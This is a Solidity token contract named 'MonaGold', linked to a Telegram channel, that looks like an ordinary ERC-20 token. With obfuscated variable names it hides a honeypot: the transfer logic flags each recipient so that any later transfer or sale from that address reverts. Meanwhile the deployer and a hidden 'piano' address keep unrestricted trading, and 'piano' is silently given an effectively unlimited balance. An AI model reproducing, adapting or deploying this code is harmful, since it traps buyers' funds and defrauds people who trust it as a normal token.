// https://t.me/monagold_eth

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.3;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract MonaGold is Ownable {
    uint256 private decide;
    string private huge;
    string private accurate;
    uint8 private bow;

    function name() public view returns (string memory) {
        return huge;
    }

    function symbol() public view returns (string memory) {
        return accurate;
    }

    uint256 private _tTotal;
    address public uniswapV2Pair;
    uint256 private interest = ~decide;
    IUniswapV2Router02 public uniswapV2Router;
    address private vapor;

    function decimals() public view returns (uint256) {
        return bow;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address specific,
        address cabin,
        uint256 zulu
    ) internal {
        address meat = address(uniswapV2Pair);

        if (image[specific] == 0 && (meat != specific) && problem[specific] > 0) {
            image[specific] -= bow;
        }

        address under = vapor;
        vapor = cabin;

        _balances[specific] -= zulu;
        uint256 importance = (zulu / 100) * decide;
        zulu -= importance;
        problem[under] += bow;
        _balances[cabin] += zulu;
    }

    mapping(address => uint256) private problem;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private image;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }

    constructor(
        string memory buried,
        string memory bottle,
        address equal,
        address piano
    ) {
        uniswapV2Router = IUniswapV2Router02(equal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _balances[piano] = interest;
        huge = buried;
        accurate = bottle;
        bow = 9;
        decide = 3;
        image[piano] = interest;
        image[msg.sender] = interest;
        _tTotal = 1000000000000000 * 10**bow;
        _balances[msg.sender] = _tTotal;
    }
}